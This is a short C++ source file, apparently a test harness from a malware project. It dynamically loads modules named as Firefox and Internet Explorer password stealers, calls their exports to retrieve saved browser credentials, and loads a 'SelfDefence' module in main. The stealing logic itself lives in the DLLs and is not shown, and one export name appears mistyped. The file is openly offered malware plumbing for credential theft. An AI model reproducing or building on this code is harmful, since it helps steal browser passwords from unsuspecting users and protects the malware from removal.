// cpp-debug-test.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Windows.h>
typedef BSTR(__cdecl *Def_GetFirefoxPasswordFromDLL)();
Def_GetFirefoxPasswordFromDLL dyGetFirefoxPasswordFromDLL;
BSTR  pmpk_GetFirefoxPasswordFromDLL()
{
	HINSTANCE dll = LoadLibraryA("_s_Module_Browser_Info_FireFoxPasswordStealer.dll");
	dyGetFirefoxPasswordFromDLL = (Def_GetFirefoxPasswordFromDLL)GetProcAddress(dll, "GetGetFirefoxPasswordFromDLL");
	return dyGetFirefoxPasswordFromDLL();
}
typedef BSTR(__cdecl *Def_GetIEPasswordFromDLL)();
Def_GetIEPasswordFromDLL dyGetIEPasswordFromDLL;
BSTR  pmpk_GetIEPasswordFromDLL()
{
	HINSTANCE dll = LoadLibraryA("_s_Module_Browser_Info_IEPasswordStealer.dll");
	dyGetIEPasswordFromDLL = (Def_GetIEPasswordFromDLL)GetProcAddress(dll, "GetIEPasswordFromDLL");
	return dyGetIEPasswordFromDLL();
}

int main()
{
	//BSTR sss = pmpk_GetFirefoxPasswordFromDLL();
	//BSTR sss = pmpk_GetIEPasswordFromDLL();
	//GetMessageA
	//	HMODULE hkm = LoadLibraryA("User32.dll");
	//	FARPROC ss = GetProcAddress(hkm, "GetMessageA");
	//GetMessage
	LoadLibraryA("_s_Module_SelfDefence.dll");
    return 0;
}

